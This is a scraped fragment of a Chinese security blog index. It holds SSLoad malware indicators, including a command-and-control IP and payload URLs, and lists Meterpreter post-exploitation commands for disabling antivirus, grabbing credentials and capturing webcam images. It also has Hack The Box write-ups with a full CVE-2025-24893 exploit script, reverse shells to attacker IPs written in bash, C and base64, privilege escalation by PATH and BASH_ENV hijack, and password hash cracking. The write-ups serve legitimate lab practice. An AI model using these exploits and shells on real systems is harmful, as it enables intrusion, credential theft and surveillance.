http://mmtixmm.org/65629679a60671570e93799683b05/case49308469q2097/court/out/367910732497/documents?t017538i87=0535008152&amp;i=qz&amp;dmc=www.scotchblue.com&amp;4666842q3&amp;cmp=horvitzlevy&amp;4721702y0 ASSOCIATED FAKE AZURE DOWNLOAD PAGE: https://mebumau.org/?4666842q3&amp;4721702y0&amp;cmp=horvitzlevy&amp;dmc=www.scotchblue.com&amp;i=qz&amp;t017538i87=0535008152 EXAMPLES OF FIREBASESTORAGE URLS FOR JS DOWNLOAD: https://firebasestorage.googleapis.com/v0/b/terfe-419414.appspot.com/o/I3Hl2Mxyqs%2FLetter_b23_98b161159-63t511248325-3676a8.js?alt=media&amp;token=a097d607-7759-4aaa-b6e2-bfe5c43df76e https://firebasestorage.googleapis.com/v0/b/terfe-419414.appspot.com/o/VbxHHBQUee%2FLetter_u79_20w517865-65u0451500340-7186n6.js?alt=media&amp;token=41e2b597-6b12-448a-92d1-9c770c818489 SHA256 EXAMPLES OF DOWNLOADED .JS FILES: 93a215b08cce42249341816df7a85edac12d4bcef166b15da64bb238637f6e76 Letter_b23_98b161159-63t511248325-3676a8.js 5fb093a9348fcf4a81befda978c948796a8319fcabe7899c2cf5ba1419ec9d35 Letter_u79_20w517865-65u0451500340-7186n6.js ABOVE .JS FILES RETRIEVE MSI FILE FROM THE FOLLOWING URL: file:\\globalsolutionunlimitedltd.com@80\\share\\sharepoint.msi DOWNLOADED MSI FILE: SHA256 hash: 90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750 File size: 1,725,952 bytes File location: file:\\globalsolutionunlimitedltd.com@80\\share\\sharepoint.msi &lt;– No longer online Sample available at: https://bazaar.abuse.ch/sample/90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750/ SSLOAD DLL INSTALLED AND RUN BY THE ABOVE MSI FILE: SHA256 hash: 09ffc4188bf11bf059b616491fcb8a09a474901581f46ec7f2c350fbda4e1e1c File size: 718.848 bytes File location: C:\\Users[username]\\AppData\\Local\\sharepoint\\MenuEx.dll Run method: regsvr32.exe /s [filename] Sample available at: https://bazaar.abuse.ch/sample/09ffc4188bf11bf059b616491fcb8a09a474901581f46ec7f2c350fbda4e1e1c/ Note: This malware is kept persistent by a scheduled task. POST-INFECTION TRAFFIC: https://t.me/+st2YadnCIU1iNmQy 85.239.53.219 port 80 - 85.239.53.219 - GET /api/g &lt;– encrypted payload port 443 - api.ipify.org - HTTPS traffic 85.239.53.219 port 80 - 85.239.53.219 - POST /api/gateway HTTP/1.1 , JSON (application/json) 85.239.53.219 port 80 - 85.239.53.219 - POST /api/b0408631-d621-61e4-7035-f7d17fc50af8/tasks HTTP/1.1 85.239.53.219 port 80 - 85.239.53.219 - GET /download?id=Cosmos&amp;module=2&amp;filename=None HTTP/1.1 知识参考","link":"/20240415-Malware/"},{"title":"OSINT","text":"OSINT 收集域名信息sublist3r利用OSINT技术枚举主域名的所有子域名 Maltego提取互联网上公开资料来收集个人信息 OSRFramework用于执行开源情报计划的工具 usufy用于多搜索引擎搜索、识别URL中的关键字，并自动列举和CSV格式存储所有结果 mailfy通过API调用在havaibeenpawned.com自动搜索 searchfy在Facebook、Github、Instagram、Twitter和Youtube中搜索关键词 Passive Total针对任何特定目标域名提供OSINT能力的另一个平台 网络爬虫 theHarvester脚本，进行搜索 获取用户信息 TinEye提供在线反向图像搜索门户网站 Shodan SpiderFoot Spyse ZoomEye Google Hacking 数据库用户密码列表cupp生成密码字典 自定义密码破解字典CeWL给定URL进行指定深度的爬取，返回一个字典列表用于密码破解 twofi从Twitter提取字典","link":"/OSINT/"},{"title":"Post-exploitation attack","text":"Information gathering 进程迁移在获得Meterpreter Shell后，如何进行下一步 使用命令ps查看正在运行的进程 使用getpid查看Meterpreter Shell的进程号 进程迁移：之后使用migrate命令将Shell移动到其他进程里面，或者使用 1run post/windows/manage/migrate 系统自动寻找合适的进程进行迁移 系统命令sysinfo命令查看目标机的系统信息使用命令 1run post/windows/gather/checkvm 来查看目标机是否运行再虚拟机上 命令idletime查看目标机最近运行时间 命令route查看路由信息 命令getuid查看当前目标机器上已经渗透成功的用户名 命令 1run post/windows/manage/killav 关闭目标机系统杀毒软件 命令 1run post/windows/manage/enable_rdp 启用目标机的远程桌面协议 3389端口 命令 1run post/windows/manage/autoroute 查看目标机本地子网情况 使用background将Meterpreter终端隐藏在后台，之后使用route add添加路由，可以使用route print查看 命令 1run post/windows/gather/enum_logged_on_users 列举当前多少用户登陆了目标机 命令 1run post/windows/gather/enum_applications 列举装在目标机上的应用 命令 1run windows/gather/credentials/windows_autologin 可以抓取自动登录的用户名和密码 屏幕截图命令 12load espiascreengrab or 1screenshot 命令 1webcam_list 查看有没有摄像头 命令 1webcam_snap 拍摄 命令 1webcam_stream 开启直播命令 1shell 进入目标机Shell 文件系统命令1234567pwd # 目标机目录get lwd # 查看当前处于本地哪个目录lscd search -f *.txt -d c:\\ # 查看C盘中所有以.txt为拓展名的文件download c:\\xxx /root # 将特定文件下载upload /root c: # 将文件上传","link":"/Post-exploitation-attack-information-gathering/"},{"title":"Post-exploitation attack","text":"Privilege escalation 纵向提权 and 横向提权Windows命令行 12shellwhoami /groups 当前组为Mandatory Label\\Medium Mandatory Level，为标准用户那么就需要升到管理员权限，也就是Mandatory Lable\\High Mandatory Level getuid查看已经获得的权限 并尝试使用getsystem发现失败了 进入shell使用systeminfo看看打了哪些补丁 尽量使用最新的的EXP进行提权 show options set session 1 貌似没成功","link":"/Post-exploitation-attack-privilege-escalation/"},{"title":"Pwned-Exploiting HTB Editor","text":"Editor 第一步先上nmap进行扫描1nmap -sV -sC --min-rate 1000 --max-retries 1 10.10.11.80 --verbose 扫描结果显示目标主机开放了 22、80 和 8080 端口，其中 80 与 8080 端口表明其运行了 HTTP 服务。 第二步访问目标的 HTTP 服务时发现无法正常响应，经检查需要将目标域名手动添加到/etc/hosts中才能访问。 进入网站后发现页面内容较为简单，没有明显可利用的渗透点。随后尝试访问其 8080 端口。 识别到目标运行的版本为 XWiki Debian 15.10.8，随后在 Exploit-DB 中检索到该版本存在已知漏洞，可被利用进行进一步渗透。 但是给出的POC无法使用，故寻找其他的POC。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#!/usr/bin/python3import argparseimport urllib.parseimport requestsimport sys# Define color dictionarycolor = { &quot;NC&quot;: '\\033[0m', &quot;RED&quot;: '\\033[91m', &quot;GREEN&quot;: '\\033[92m', &quot;YELLOW&quot;: '\\033[93m', &quot;BLUE&quot;: '\\033[94m', &quot;MAGENTA&quot;: '\\033[95m', &quot;CYAN&quot;: '\\033[96m', &quot;WHITE&quot;: '\\033[97m'}# Define some pretty charactersSTAR: str = f&quot;{color['YELLOW']}[{color['BLUE']}*{color['YELLOW']}]{color['NC']}&quot;WARNING_STR: str = f&quot;{color['RED']}[{color['YELLOW']}!{color['RED']}]{color['NC']}&quot;# Ctrl+Cdef signal_handler(sig, frame)-&gt;None: print(f&quot;\\n{WARNING_STR} {color['RED']}Ctrl+C! Exiting...{color['RESET']}&quot;) sys.exit(1)def parse_arguments()-&gt;argparse.Namespace: &quot;&quot;&quot; Get arguments from user &quot;&quot;&quot; # Create an ArgumentParser object parser = argparse.ArgumentParser(description=f&quot;{color['BLUE']}CVE-2025-24893{color['NC']} exploit by {color['RED']}gunzf0x{color['NC']}&quot;, epilog=f&quot;&quot;&quot;{color['YELLOW']}Example usage:{color['NC']}{color['GREEN']}python3 {sys.argv[0]} -t 'http://example.com:8080' -c 'ping -c1 10.10.10.10'{color['NC']}&quot;&quot;&quot;, formatter_class=argparse.RawTextHelpFormatter) # Add arguments with flags parser.add_argument(&quot;-t&quot;, &quot;--target&quot;, type=str, help=&quot;Target url. For example: 'http://example.com' or 'http://example.com:8080'&quot;, required=True) parser.add_argument(&quot;-c&quot;, &quot;--command&quot;, type=str, help=&quot;System command to execute in the target machine&quot;, required=True) # Return the parsed arguments return parser.parse_args()def check_url(original_url: str)-&gt;str: &quot;&quot;&quot; Check if url provided is in correct format &quot;&quot;&quot; if not original_url.startswith(&quot;http://&quot;) or not original_url.startswith(&quot;https://&quot;): print(f&quot;{WARNING_STR} protocol not found in url (HTTP or HTTPs). Assumming it is 'https' adding 'http://' string to url...&quot;) return 'http://' + original_url return original_urldef exploit(target: str, command: str)-&gt;None: &quot;&quot;&quot; Exploit for CVE-2025-24893 attacking vulnerable endpoint &quot;&quot;&quot; # Set target url print(f&quot;{STAR} Attacking {color['CYAN']}{target}{color['NC']}&quot;) url_payload: str = f&quot;{target[:-1] if target.endswith('/') else target}/xwiki/bin/get/Main/SolrSearch?media=rss&amp;text=&quot; original_payload: str = f'}}}}{{{{async async=false}}}}{{{{groovy}}}}&quot;{command}&quot;.execute(){{{{/groovy}}}}{{{{/async}}}}' encoded_payload: str = urllib.parse.quote(original_payload) vulnerable_endpoint: str = f&quot;{url_payload}{encoded_payload}&quot; print(f&quot;{STAR} Injecting the payload:\\n{color['CYAN']}{vulnerable_endpoint}{color['NC']}&quot;) try: requests.get(vulnerable_endpoint, verify=False, timeout=15) except Exception as e: print(f&quot;{WARNING_STR} {color['RED']}An error ocurred:\\n{color['YELLOW']}{e}{color['NC']}&quot;) sys.exit(1) print(f&quot;{STAR} {color['MAGENTA']}Command executed{color['NC']}&quot;) print(&quot;\\n~Happy Hacking&quot;) def main()-&gt;None: # Get arguments form user args: argparse.Namespace = parse_arguments() # Execute the exploit attacking the vulnerable endpoint exploit(args.target, args.command)if __name__ == &quot;__main__&quot;: main() 利用该脚本对网站进行反弹shell 123456# 首先攻击端进行端口监听ncat -lnvp 4444# 之后进行反弹shelll，不知道为什么加busybox的自行查阅python CVE-2024-24893.py -t http://wiki.editor.htb/ -c 'busybox nc 10.10.16.3 4444 -e /bin/bash'# 开启交互式终端便于操作python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' 提权123456789101112131415161718192021222324# 进入home后发现有个名为oliver的用户cd /home# 回到刚进来时的文件夹cd /usr/lib/xwiki-jetty# 通过询问gpt，可以获取相关的结构信息，找到一个名为hibernate.cfg.xml的配置文件，通过该命令发现其中存在密码，密码为# theEd1t0rTeam99grep passw* hibernate.cfg.xml # 下面尝试进行ssh连接ssh oliver@10.10.11.80# 发现连接成功，获得user flagoliver@editor:~$ cat user.txt9afa9913d95e68e660182441f4d2c3e4# 下面尝试进行root提权，看看有没有什么是root下面执行，发现没有oliver@editor:~$ sudo -l[sudo] password for oliver: Sorry, user oliver may not run sudo on editor.# 查看网络监听情况，发现其有若干的端口监听服务，一个一个看，进行端口转发netstat -nutl 12# 进行端口转发，这样就可以远程访问19999端口啦ssh -L 19999:127.0.0.1:19999 oliver@10.10.11.80 发现为Netdata网站，并且进去有红色升级提醒，那就看看是否存在漏洞。 查阅后发现确实存在漏洞，编号为CVE-2024-32019。受影响的 Netdata Agent 版本附带的工具ndsudo允许攻击者以root权限运行任意程序。通过google找到了相应的POC。CVE-2024-32019-POC 123456789# 首先按照他的POC找到该文件的位置oliver@editor:~$ find / -name ndsudo 2&gt;/dev/null# 位置为/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo# 执行一下oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-listnvme : not available in PATH. 123456789101112// 按照他给的代码改动再次反弹shell#include &lt;unistd.h&gt; // for setuid, setgid, execl#include &lt;stddef.h&gt; // for NULLint main(){ setuid(0); setgid(0); execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.3/9999 0&gt;&amp;1&quot;, NULL); return 0;} 123456789101112# 首先编译一下，因为我的电脑为M4版本Mac电脑，需要使用docker才能编译为x86_64的docker run --rm --platform linux/amd64 -v &quot;$PWD&quot;:/src -w /src ubuntu:latest bash -c &quot;apt update &amp;&amp; apt install -y build-essential &amp;&amp; gcc -o nvme exploit.c -static&quot;# 得到nvme之后将其传入到目标机器scp oliver@10.10.11.80# 修改其可执行权限，并把所在目录加入到PATHchmod +x nvmeexport PATH=$(pwd):$PATH# 执行命令 即可以root身份反弹shell/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list 又学到了T_T","link":"/Pwned-Exploiting-HTB-Editor/"},{"title":"Pwned-Exploiting HTB Environment","text":"Environment 第一步用nmap进行扫描1nmap -sV -sC -Pn --min-rate 2000 10.10.11.67 --verbose 发现有22，80端口。那就访问一下80端口，发现无法访问，那就添加到/etc/hosts里面。 1echo '10.10.11.67\\environment.htb' | sudo tee -a /etc/hosts 找一找，抓抓包，发现没什么可以利用的，那就扫下其他文件和子域名。 1234# 扫文件python dirsearch.py -u http://environment.htb/# 扫域名ffuf -w fuzzDicts/subdomainDicts/main.txt -u http://environment.htb/ -H &quot;Host: FUZZ.environment.htb&quot; 域名没扫出来什么，扫出了login登陆界面，还有个upload的界面。 抓一抓login的包看看，发现删掉remeber后可以看到源代码。f输入其他值发现，可以看到如下源代码。当PHP环境为preprod的时候，就会以id=1的用户登录。 去找下Laravel 11.30.0有没有CVE能够修改环境的。CVE-2024-52301。 直接请求。 登录成功后可以上传文件，上传个php试试。 直接上传个反弹shell的php，之后访问该php，成功反弹shell。 提权12# 交互式终端python3 -m 'import pty;pty.spawn(&quot;/bin/bash/&quot;)' 到处看一看，发现对hish的目录有访问的权限。可以先获取user.txt 进入到backup，发现一个keyvault.gpg文件，可能是加密过的文件。进入.gnupg，目录丢给gpt，回答可能是私钥信息。 那就验证一下，发现查看私钥的时候没有权限，那就复制到别的地方。 之后解密一下看看。 1234567891011121314151617181920212223242526272829303132333435363738394041424344# ssh登录一下ssh hish@10.10.11.67 # 登录成功后看看什么可以以root身份执行hish@environment:~$ sudo -l[sudo] password for hish: Matching Defaults entries for hish on environment: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=&quot;ENV BASH_ENV&quot;, use_ptyUser hish may run the following commands on environment: (ALL) /usr/bin/systeminfo# 发现有个systeminfo 可以，查看下内容cat /usr/bin/systeminfo#!/bin/bashecho -e &quot;\\n### Displaying kernel ring buffer logs (dmesg) ###&quot;dmesg | tail -n 10echo -e &quot;\\n### Checking system-wide open ports ###&quot;ss -antlpecho -e &quot;\\n### Displaying information about all mounted filesystems ###&quot;mount | column -techo -e &quot;\\n### Checking system resource limits ###&quot;ulimit -aecho -e &quot;\\n### Displaying loaded kernel modules ###&quot;lsmod | head -n 10echo -e &quot;\\n### Checking disk usage for all filesystems ###&quot;df -h# 那就生成反弹shell的同名文件，发现没办法执行成功，那就把sudo -l的内容给gpt问问，有什么可以利用的。echo 'bash -p' &gt; exp.shchmod +x exp.shsudo BASH_ENV=./exp.sh /usr/bin/systeminfo# 获取到root权限root@environment:~# whoamiroot 又学到了T_T","link":"/Pwned-Exploiting-HTB-Environment/"},{"title":"Pwned-Exploiting HTB Era","text":"Era 第一步用nmap进行扫描1nmap -sV -sC -Pn --min-rate 2000 10.10.11.79 --verbose 发现有21，80端口。那就访问一下80端口，发现无法访问，那就添加到/etc/hosts里面。 1echo '10.10.11.79\\tera.htb' | sudo tee -a /etc/hosts 找一找，抓抓包，发现没什么可以利用的，那就扫下其他文件和子域名。 1234# 扫文件python dirsearch.py -u http://era.htb/# 扫域名ffuf -w fuzzDicts/subdomainDicts/main.txt -u http://era.htb/ -H &quot;Host: FUZZ.era.htb&quot; 发现了一个file的子域名。无法访问，添加到/etc/hosts中。 123echo '10.10.11.79\\tfile.era.htb' | sudo tee -a /etc/hosts# 扫一扫，为什么-fw 4 因为不加的话，会出现很多，那就判断Words: 4无效ffuf -w ../fuzzDicts/subdomainDicts/main.txt -u http://era.htb/ -H &quot;Host: FUZZ.era.htb&quot; -fw 4 但是需要登录，那就扫扫file.era.htb看看有没有其他的文件。 12# 扫扫文件python dirsearch.py -u http://file.era.htb/ 有个register.php，进去看看是不是能注册。注册之后，可以登录。并且可以上传文件，那就上传一个脚本看看。发现有编号。那其实可以看看都有什么文件。 123456789seq 4000 &gt; num.txt# 试了下，全是302，是不是有cookieffuf -u 'http://file.era.htb/download.php?id=FUZZ' -w ../../Downloads/num.txt # 再试下，过滤掉没有的3161，再试试ffuf -u 'http://file.era.htb/download.php?id=FUZZ' -w ../../Downloads/num.txt -H &quot;Cookie:PHPSESSID=iv03adftavqoviaa3q3aj9ffvn&quot;ffuf -u 'http://file.era.htb/download.php?id=FUZZ' -w ../../Downloads/num.txt -H &quot;Cookie:PHPSESSID=iv03adftavqoviaa3q3aj9ffvn&quot; -fw 3161 有两个文件被搜到，下载到本地看一看。 在site-backup里面有个数据库文件，看一看。 12345678910111213141516171819202122232425262728sqlite3 filedb.sqlite # 看看表sqlite&gt; .tablesfiles users# 看看字段，发现有密码.schema usersCREATE TABLE users ( user_id INTEGER PRIMARY KEY AUTOINCREMENT, user_name varchar(255) NOT NULL, user_password varchar(255) NOT NULL, auto_delete_files_after int NOT NULL , security_answer1 varchar(255), security_answer2 varchar(255), security_answer3 varchar(255));# 看看内容SELECT * FROM users# 那就解一下密码echo 'admin_ef01cab31aa:$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPCeric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxmveronica:$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOKyuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.john:$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6ethan:$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC' &gt; hashes.txtjohn --wordlist=../tools/rockyou.txt hashes.txt john --show hashes.txt# 解出来两个eric:americayuri:mustang 有这两个账户登录看看，发现也没什么有用的，看看文件夹里其他的php。security_login.php，网页登录看看。之前发现了admin账户的一些认证问题，登录看看。发现也没什么，之前有个21端口开着，看看ftp能不能登录。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283# 发现yuri可以登录ftp 10.10.11.79 Name (10.10.11.79): yuri331 Please specify the password.Password: 230 Login successful.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x 2 0 0 4096 Jul 22 08:42 apache2_confdrwxr-xr-x 3 0 0 4096 Jul 22 08:42 php8.1_conf226 Directory send OK.# 进去看一看 下载到本地看一看 好像也没什么可以利用的ftp&gt; cd apache2_confftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r-- 1 0 0 1332 Dec 08 2024 000-default.conf-rw-r--r-- 1 0 0 7224 Dec 08 2024 apache2.conf-rw-r--r-- 1 0 0 222 Dec 13 2024 file.conf-rw-r--r-- 1 0 0 320 Dec 08 2024 ports.conf# 进入php8.1_conf看一看ftp&gt; cd php8.1_conf250 Directory successfully changed.ftp&gt; ls -al200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x 3 0 0 4096 Jul 22 08:42 .drwxr-xr-x 4 0 114 4096 Jul 22 08:42 ..drwxr-xr-x 2 0 0 4096 Jul 22 08:42 build-rw-r--r-- 1 0 0 35080 Dec 08 2024 calendar.so-rw-r--r-- 1 0 0 14600 Dec 08 2024 ctype.so-rw-r--r-- 1 0 0 190728 Dec 08 2024 dom.so-rw-r--r-- 1 0 0 96520 Dec 08 2024 exif.so-rw-r--r-- 1 0 0 174344 Dec 08 2024 ffi.so-rw-r--r-- 1 0 0 7153984 Dec 08 2024 fileinfo.so-rw-r--r-- 1 0 0 67848 Dec 08 2024 ftp.so-rw-r--r-- 1 0 0 18696 Dec 08 2024 gettext.so-rw-r--r-- 1 0 0 51464 Dec 08 2024 iconv.so-rw-r--r-- 1 0 0 1006632 Dec 08 2024 opcache.so-rw-r--r-- 1 0 0 121096 Dec 08 2024 pdo.so-rw-r--r-- 1 0 0 39176 Dec 08 2024 pdo_sqlite.so-rw-r--r-- 1 0 0 284936 Dec 08 2024 phar.so-rw-r--r-- 1 0 0 43272 Dec 08 2024 posix.so-rw-r--r-- 1 0 0 39176 Dec 08 2024 readline.so-rw-r--r-- 1 0 0 18696 Dec 08 2024 shmop.so-rw-r--r-- 1 0 0 59656 Dec 08 2024 simplexml.so-rw-r--r-- 1 0 0 104712 Dec 08 2024 sockets.so-rw-r--r-- 1 0 0 67848 Dec 08 2024 sqlite3.so-rw-r--r-- 1 0 0 313912 Dec 08 2024 ssh2.so-rw-r--r-- 1 0 0 22792 Dec 08 2024 sysvmsg.so-rw-r--r-- 1 0 0 14600 Dec 08 2024 sysvsem.so-rw-r--r-- 1 0 0 22792 Dec 08 2024 sysvshm.so-rw-r--r-- 1 0 0 35080 Dec 08 2024 tokenizer.so-rw-r--r-- 1 0 0 59656 Dec 08 2024 xml.so-rw-r--r-- 1 0 0 43272 Dec 08 2024 xmlreader.so-rw-r--r-- 1 0 0 51464 Dec 08 2024 xmlwriter.so-rw-r--r-- 1 0 0 39176 Dec 08 2024 xsl.so-rw-r--r-- 1 0 0 84232 Dec 08 2024 zip.so# 里面好多so文件，问问gpt，gpt说ssh2.so 提供了 PHP 使用 SSH 协议的能力，相当于在 PHP 里嵌入了一个迷你版的 SSH/SFTP 客户端。# 在 PHP 脚本里，如果 ssh2 扩展已启用，可以调用一些函数，例如：# ssh2_connect() → 建立 SSH 连接# ssh2_auth_password() → 使用用户名/密码认证# ssh2_exec() → 在远程服务器上执行命令# ssh2_scp_send() / ssh2_scp_recv() → 通过 SCP 上传/下载文件# ssh2_sftp() → 打开一个 SFTP 会话# 看看是不是可以利用，返回去看看php文件，有个download.php，丢到gpt里面# 管理员模式下（show=true 且 erauser=1），拼接了 $wrapper . $file，而且 $wrapper 可以是任意协议（只要 format 里包含 ://）。# PHP 内置了很多 stream wrapper，比如：# php://filter → 可以对文件做 base64 编码读取# ftp:// → 可以访问 FTP 文件# ssh2:// → 如果扩展启用，可以走 SSH# http:// → 可以请求外部 URL（前提是 allow_url_fopen 开启）# 这就意味着如果管理员账号能登录，就能用 format 参数结合 wrapper 访问到不在正常文件目录下的内容。# 说明存在利用空间 反弹shell 记得末尾加； 因为每次执行，看到和files是连着的，加了之后就执行成功了http://file.era.htb/download.php?id=54&amp;show=true&amp;format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27printf%20KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy80NDQ0ICAwPiYxKSAm|base64%20-d|bash%27;# 反弹成功 提权先把linpeas传上去，执行看看哪些地方可以提权。 后面不知道咋做了，网上搜到大佬的笔记，上传pspy查看进程。 123wget http://10.10.16.3:9999/pspy64# 执行pspy 丢给GPT。 1234567891011121314151617181920212223242526272829CRON 任务执行UID=0 PID=64453 | /usr/sbin/CRON -f -P root 用户（UID=0）运行的 CRON 守护进程-f 表示前台运行-P 是 CRON 的日志输出标志bash 执行脚本/bin/sh -c bash -c '/root/initiate_monitoring.sh' &gt;&gt; /opt/AV/periodic-checks/status.log 2&gt;&amp;1 CRON 调用 bash 来执行 /root/initiate_monitoring.sh输出和错误都重定向到 /opt/AV/periodic-checks/status.log多条类似命令显示脚本被重复或周期性调用objcopyobjcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitorroot 运行的 objcopy 命令从 /opt/AV/periodic-checks/monitor 可执行文件中导出 .text_sig 段到 text_sig_section.bin可能是 AV 或监控程序用来验证二进制完整性监控程序/opt/AV/periodic-checks/monitorAV 或监控程序自身执行可能由 CRON 脚本触发 关键就是以root权限执行咱们反弹shell，那就先编写一个可执行的文件 1234567891011121314151617181920212223242526272829303132333435363738394041# so文件file monitormonitor: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=45a4bb1db5df48dcc085cc062103da3761dd8eaf, for GNU/Linux 3.2.0, not stripped# 写到ex.c文件中#include &lt;stdlib.h&gt; int main() { system(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.3/5555 0&gt;&amp;1'&quot;); return 0; }gcc ex.c -o ex# 再把ex传到目标机器wget http://10.10.16.3:9999/ex # 获取.text_sig字段objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor# 添加字段objcopy --add-section .text_sig=text_sig_section.bin exrm monitormv ex monitor# 同时启动端口监听ncat -lvnp 5555Ncat: Version 7.97 ( https://nmap.org/ncat )Ncat: Listening on [::]:5555Ncat: Listening on 0.0.0.0:5555Ncat: Connection from 10.10.11.79:38388.bash: cannot set terminal process group (65499): Inappropriate ioctl for devicebash: no job control in this shellroot@era:~# lsanswers.shclean_monitor.shinitiate_monitoring.shmonitorroot.txttext_sig_section.binroot@era:~# cat root.txt05ee929a181ae44e2282d82ff12eb7ba 又学到了T_T","link":"/Pwned-Exploiting-HTB-Era/"},{"title":"Pwned-Exploiting HTB Outbound","text":"Outbound 第一步用nmap进行扫描1nmap -sV -sC --min-rate 1000 --max-retries 1 10.10.11.73 --verbose 发现有22、80端口。那就看看80端口服务，是个邮箱系统，直接把php代码甩给gpt，发现系统为Roundcube Webmail 1.6.10，那就开始找是否存在漏洞。 那就去找POC，CVE-2025-27591-PoC。 按照HTB的账号密码提示，以及POC的脚本执行命令，直接执行。 1234# 首先开启监听端口ncat -lvnp 4444php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 'bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.3/4444 0&gt;&amp;1&quot;' 直接反弹shell 提权下一步就看看有啥能利用的，先切换到提示用户 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970su tyler# 看看能不能创建交互式命令行which python3which python# 都没有显示，那就不行了，如果有其他方法，我也不知道# 进入home看看有几个用户cd /homels -altotal 32drwxr-xr-x 1 root root 4096 Jun 8 12:05 .drwxr-xr-x 1 root root 4096 Jul 9 12:41 ..drwxr-x--- 1 jacob jacob 4096 Jun 7 13:55 jacobdrwxr-x--- 1 mel mel 4096 Jun 8 12:06 meldrwxr-x--- 1 tyler tyler 4096 Jun 8 13:28 tyler# 在tyler里面看一圈，好像也没啥东西，再看看有啥能执行，发现不行sudo -lbash: line 25: sudo: command not found# 那就去网页的地方看看cd /var/www/htmlls -latotal 28drwxr-xr-x 1 root root 4096 Jun 6 18:55 .drwxr-xr-x 1 root root 4096 Jun 6 18:55 ..-rw-r--r-- 1 root root 615 Jun 6 18:55 index.nginx-debian.htmldrwxr-xr-x 1 www-data www-data 4096 Jun 6 18:55 roundcube# 进到roundcube看看cd roundcubels -altotal 412drwxr-xr-x 1 www-data www-data 4096 Jun 6 18:55 .drwxr-xr-x 1 root root 4096 Jun 6 18:55 ..-rw-r--r-- 1 www-data www-data 2553 Feb 8 2025 .htaccess-rw-r--r-- 1 www-data www-data 216244 Feb 8 2025 CHANGELOG.md-rw-r--r-- 1 www-data www-data 12714 Feb 8 2025 INSTALL-rw-r--r-- 1 www-data www-data 35147 Feb 8 2025 LICENSE-rw-r--r-- 1 www-data www-data 3853 Feb 8 2025 README.md-rw-r--r-- 1 www-data www-data 1049 Feb 8 2025 SECURITY.mddrwxr-xr-x 7 www-data www-data 4096 Feb 8 2025 SQL-rw-r--r-- 1 www-data www-data 4657 Feb 8 2025 UPGRADINGdrwxr-xr-x 2 www-data www-data 4096 Feb 8 2025 bin-rw-r--r-- 1 www-data www-data 1086 Feb 8 2025 composer.json-rw-r--r-- 1 www-data www-data 56802 Feb 8 2025 composer.lockdrwxr-xr-x 2 www-data www-data 4096 Jun 6 18:55 config-rw-r--r-- 1 www-data www-data 11200 Feb 8 2025 index.phpdrwxr-xr-x 1 www-data www-data 4096 Jun 11 07:46 logsdrwxr-xr-x 37 www-data www-data 4096 Feb 8 2025 pluginsdrwxr-xr-x 8 www-data www-data 4096 Feb 8 2025 programdrwxr-xr-x 3 www-data www-data 4096 Jun 6 18:55 public_htmldrwxr-xr-x 3 www-data www-data 4096 Feb 8 2025 skinsdrwxr-xr-x 1 www-data www-data 4096 Aug 13 01:40 tempdrwxr-xr-x 14 www-data www-data 4096 Feb 8 2025 vendor# 看到有个config，看看去cd configls -altotal 92drwxr-xr-x 2 www-data www-data 4096 Jun 6 18:55 .drwxr-xr-x 1 www-data www-data 4096 Jun 6 18:55 ..-rw-r--r-- 1 www-data www-data 164 Feb 8 2025 .htaccess-rw-r--r-- 1 root root 3024 Jun 6 18:55 config.inc.php-rw-r--r-- 1 www-data www-data 2943 Feb 8 2025 config.inc.php.sample-rw-r--r-- 1 www-data www-data 65000 Feb 8 2025 defaults.inc.php-rw-r--r-- 1 www-data www-data 2806 Feb 8 2025 mimetypes.php# 看吧，一个一个的cat config.inc.php 把内容直接甩给gpt，人家都说的很明白了。 1234567891011121314151617181920212223242526# 因为没有交互式终端 只能连接同时执行数据库命令mysql -u roundcube -p'RCDBPass2025' -h localhost roundcube -e &quot;SHOW TABLES;&quot;Tables_in_roundcubecachecache_indexcache_messagescache_sharedcache_threadcollected_addressescontactgroupmemberscontactgroupscontactsdictionaryfilestoreidentitiesresponsessearchessessionsystemusers# 看看users吧，里面三个用户，也没有密码mysql -u roundcube -p'RCDBPass2025' -h localhost roundcube -e &quot;SELECT * FROM users;&quot;# 看看sessionmysql -u roundcube -p'RCDBPass2025' -h localhost roundcube -e &quot;SELECT * FROM session;&quot; 